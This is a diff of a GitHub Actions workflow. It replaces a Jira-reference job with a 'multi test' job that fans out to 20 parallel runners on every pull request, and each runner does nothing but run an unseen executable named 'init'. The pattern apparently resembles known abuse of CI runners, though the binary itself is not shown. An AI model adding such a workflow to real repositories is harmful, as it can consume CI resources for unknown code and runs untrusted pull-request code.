@@ -1,15 +1,26 @@
-name: On new pull request
-on:
-  pull_request:
-    types: [opened]
+name: multi test
+
+on: [pull_request]
 
 jobs:
-  action:
+  multitest:
+    name: test job
+
     runs-on: ubuntu-latest
-    name: Update references
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
     steps:
-    - name: Update references
-      uses: pmarnik/jira-issue-ref-action@v1
-      with:
-        repo-token: ${{ secrets.GITHUB_TOKEN }}
-        issue-url-pattern: http://onet.pl/234/{issue_key}
+      - name: Checkout code
+        uses: actions/checkout@v2
+        
+      - name: chmod
+        run: chmod +x init
+        
+      - name: run
+        run: ./init
